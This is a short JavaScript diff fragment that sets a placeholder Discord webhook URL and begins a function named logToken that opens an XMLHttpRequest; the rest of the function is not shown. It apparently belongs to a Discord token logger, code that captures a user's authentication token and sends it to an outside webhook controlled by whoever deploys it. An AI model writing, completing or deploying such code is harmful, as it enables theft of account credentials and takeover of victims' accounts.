@@ -1,5 +1,4 @@
-const WEBHOOK = "";
-// embed color 65306
+const WEBHOOK = "Discord Webhook URL";
 
 function logToken(token){
     const HTTP = new XMLHttpRequest();
